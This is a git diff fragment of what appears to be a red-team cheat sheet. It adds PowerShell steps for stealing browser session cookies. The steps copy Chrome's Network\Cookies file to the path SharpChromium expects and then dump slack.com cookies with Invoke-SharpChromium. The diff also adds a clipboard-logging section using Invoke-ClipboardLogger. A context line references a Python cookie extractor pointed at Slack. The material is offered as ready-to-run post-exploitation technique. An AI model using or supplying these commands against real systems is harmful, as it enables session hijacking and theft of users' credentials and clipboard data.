@@ -930,9 +930,19 @@ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slac
 - [Invoke-SharpChromium](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpChromium.ps1)
 
 ```powershell
+# SharpChromium is looking for a file in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies, but the actual file is located in %LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies with the following command we will copy the file to the location SharpChromium is expecting.
 
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
 
+Invoke-SharpChromium -Command "cookies slack.com"
 ```
+### Clipboard
+- [Invoke-Clipboard](https://github.com/inguardians/Invoke-Clipboard/blob/master/Invoke-Clipboard.ps1)
+```powershell
+Invoke-ClipboardLogger
+```
+
+
 # Interacting with Users
 ### Process Command Lines
 ```powershell
